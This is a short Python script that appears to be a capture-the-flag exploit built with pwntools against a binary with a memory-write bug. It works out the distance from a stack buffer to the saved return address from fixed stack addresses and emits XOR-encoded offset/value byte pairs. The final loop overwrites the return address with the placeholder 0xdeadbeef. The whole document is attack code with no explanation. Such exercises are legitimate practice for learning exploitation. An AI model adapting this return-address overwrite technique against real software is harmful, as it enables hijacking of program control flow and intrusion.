import sys
from pwn import *

out = lambda s: sys.stdout.write(s)

# int v5; // [sp+8h] [bp-3Ch]
# int v6; // [sp+20h] [bp-24h]
# int v7; // [sp+38h] [bp-Ch]

esp = 0xffc17e60
ebp = 0xffc17ea8
ret = ebp + 4

v6 = esp + 0x20

kill = 0xdeadbeef

# Do nothing

for i in range(0, 20):
    offset = 0
    offset ^= (i * 3)
    out(chr(offset)) # Offset
    out('A')         # Value

# Write return address
kill = p32(kill)
for i in range(0, 4):
    index = 20 + i
    offset = ((ret - v6) + i) ^ (index * 3)
    out(chr(offset)) # Offset
    out(kill[i])     # Value
